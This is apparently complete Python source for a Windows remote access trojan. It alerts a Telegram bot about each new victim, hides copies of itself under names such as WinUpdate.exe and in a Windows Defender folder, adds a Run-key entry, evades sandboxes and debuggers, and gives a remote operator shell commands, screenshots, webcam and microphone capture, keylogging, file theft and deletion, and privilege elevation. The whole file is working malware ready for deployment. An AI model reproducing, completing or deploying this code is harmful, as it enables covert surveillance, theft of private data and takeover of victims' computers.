import socket
import threading
import subprocess
import os
import json
import time
import shutil
import sys
import base64
import winreg
import platform
import requests

# Telegram config - REPLACE WITH YOUR DATA
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"

# Server config
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 4444
SECRET_KEY = "nazarhktwitch_1337"

connected_clients = []
is_running = True

def send_telegram_alert(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass

def get_external_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=10).text
        return ip
    except:
        return "Unknown"

def report_new_victim():
    try:
        hostname = platform.node()
        username = os.getenv('USERNAME', 'Unknown')
        external_ip = get_external_ip()
        
        message = f"""
🚨 New System Online

💻 Hostname: {hostname}
👤 User: {username}
🌐 IP: {external_ip}
🖥️ OS: {platform.system()} {platform.release()}

⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        send_telegram_alert(message)
    except:
        pass

def system_execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
        return result
    except Exception as e:
        return f"Command failed: {str(e)}"

def system_get_info():
    info = {
        "os": platform.system(),
        "hostname": platform.node(),
        "user": os.getenv('USERNAME'),
        "arch": platform.architecture()[0],
        "external_ip": get_external_ip()
    }
    return json.dumps(info)

def system_install_persistence():
    current_file = sys.argv[0]
    
    report_new_victim()
    
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, current_file)
    except:
        pass
    
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        target_path = os.path.join(startup_path, "system_service.exe")
        shutil.copy2(current_file, target_path)
        os.system(f'attrib +h +s "{target_path}"')
    except:
        pass
    
    system_locations = [
        os.path.join(os.getenv('WINDIR'), 'System32', 'WinUpdate.exe'),
        os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows Defender', 'platform.exe')
    ]
    
    for location in system_locations:
        try:
            os.makedirs(os.path.dirname(location), exist_ok=True)
            if not os.path.exists(location):
                shutil.copy2(current_file, location)
                os.system(f'attrib +h +s "{location}"')
        except:
            continue

def system_anti_sandbox():
    try:
        uptime = time.time() - os.stat('C:\\Windows\\System32\\kernel32.dll').st_ctime
        if uptime < 3600:
            return True
            
        import ctypes
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
            
    except:
        pass
    
    return False

def screen_capture(quality=80):
    try:
        from PIL import ImageGrab
        import cv2
        import numpy as np
        
        screen = ImageGrab.grab()
        screen_cv = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
        _, buffer = cv2.imencode('.jpg', screen_cv, encode_param)
        return buffer.tobytes()
    except Exception as e:
        return f"SCREEN_ERROR: {str(e)}".encode()

def webcam_capture():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            cam.release()
            return buffer.tobytes()
        cam.release()
        return b"WEBCAM_ERROR"
    except:
        return b"WEBCAM_UNAVAILABLE"

def audio_record(duration=5):
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for i in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        with wave.open('temp_audio.wav', 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
        
        with open('temp_audio.wav', 'rb') as f:
            audio_data = f.read()
        
        os.remove('temp_audio.wav')
        return audio_data
    except:
        return b"AUDIO_UNAVAILABLE"

def file_operation(op, path, data=None):
    try:
        if op == "list":
            items = os.listdir(path)
            return json.dumps(items)
        elif op == "download":
            with open(path, 'rb') as f:
                return f.read()
        elif op == "upload":
            with open(path, 'wb') as f:
                f.write(data)
            return "UPLOAD_SUCCESS"
        elif op == "delete":
            if os.path.isfile(path):
                os.remove(path)
            else:
                shutil.rmtree(path)
            return "DELETE_SUCCESS"
        elif op == "execute":
            os.startfile(path) if platform.system() == "Windows" else subprocess.Popen([path])
            return "EXECUTE_SUCCESS"
    except Exception as e:
        return f"FILE_ERROR: {str(e)}"

def keylogger_start(duration=300):
    log_file = os.path.join(os.getenv('TEMP'), 'system_log.txt')
    
    def on_press(key):
        try:
            with open(log_file, "a", encoding='utf-8') as f:
                f.write(f"{time.time()}: {str(key)}\n")
        except:
            pass
    
    from pynput import keyboard
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    def stop_logger():
        time.sleep(duration)
        listener.stop()
    
    stop_thread = threading.Thread(target=stop_logger)
    stop_thread.daemon = True
    stop_thread.start()
    
    return log_file

def crypto_encrypt(data):
    if isinstance(data, str):
        data = data.encode()
    
    key = SECRET_KEY.encode()
    encrypted = bytearray()
    for i in range(len(data)):
        encrypted.append(data[i] ^ key[i % len(key)])
    
    return base64.b64encode(encrypted).decode()

def crypto_decrypt(encrypted_data):
    try:
        encrypted_bytes = base64.b64decode(encrypted_data)
        key = SECRET_KEY.encode()
        decrypted = bytearray()
        for i in range(len(encrypted_bytes)):
            decrypted.append(encrypted_bytes[i] ^ key[i % len(key)])
        return decrypted.decode()
    except:
        return '{"status": "error", "data": "Decryption failed"}'

def handle_client_connection(conn, addr):
    global connected_clients
    
    print(f"New connection: {addr}")
    connected_clients.append(conn)
    
    send_telegram_alert(f"New connection from: {addr[0]}")
    
    try:
        while is_running:
            encrypted_data = conn.recv(4096).decode()
            if not encrypted_data:
                break
            
            decrypted_data = crypto_decrypt(encrypted_data)
            command = json.loads(decrypted_data)
            
            cmd_type = command.get('type')
            payload = command.get('payload', {})
            
            response = {"status": "success", "data": ""}
            
            if cmd_type == "system_info":
                response["data"] = system_get_info()
                
            elif cmd_type == "command":
                result = system_execute_command(payload.get('cmd', ''))
                response["data"] = result
                
            elif cmd_type == "screenshot":
                screen_data = screen_capture()
                response["data"] = screen_data.hex()
                
            elif cmd_type == "webcam":
                webcam_data = webcam_capture()
                response["data"] = webcam_data.hex()
                
            elif cmd_type == "audio":
                audio_data = audio_record()
                response["data"] = audio_data.hex()
                
            elif cmd_type == "keylogger_start":
                log_file = keylogger_start()
                response["data"] = f"Keylogger started: {log_file}"
                
            elif cmd_type == "file_operation":
                result = file_operation(
                    payload.get('op'),
                    payload.get('path'),
                    bytes.fromhex(payload.get('data', '')) if payload.get('data') else None
                )
                if isinstance(result, bytes):
                    response["data"] = result.hex()
                else:
                    response["data"] = result
                    
            elif cmd_type == "process_list":
                if platform.system() == 'Windows':
                    result = subprocess.check_output('tasklist', shell=True).decode('utf-8', errors='ignore')
                else:
                    result = subprocess.check_output('ps aux', shell=True).decode('utf-8', errors='ignore')
                response["data"] = result
                
            elif cmd_type == "elevate":
                try:
                    import ctypes
                    if ctypes.windll.shell32.IsUserAnAdmin():
                        response["data"] = "Already admin"
                    else:
                        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1)
                        response["data"] = "Elevation attempted"
                except:
                    response["data"] = "Elevation failed"
            
            encrypted_response = crypto_encrypt(json.dumps(response))
            conn.send(encrypted_response.encode())
            
    except Exception as e:
        print(f"Client error {addr}: {e}")
    finally:
        if conn in connected_clients:
            connected_clients.remove(conn)
        conn.close()

def start_server():
    global is_running
    
    if system_anti_sandbox():
        print("Sandbox detected, exiting")
        return
    
    if not getattr(sys, 'installed', False):
        system_install_persistence()
        sys.installed = True
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    
    print(f"Server started on {SERVER_HOST}:{SERVER_PORT}")
    
    def accept_connections():
        while is_running:
            try:
                conn, addr = server_socket.accept()
                client_thread = threading.Thread(target=handle_client_connection, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                if is_running:
                    print(f"Accept error: {e}")
    
    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.daemon = True
    accept_thread.start()
    
    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        is_running = False
    finally:
        server_socket.close()
        print("Server stopped")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--hide":
        import win32gui
        import win32con
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    
    start_server()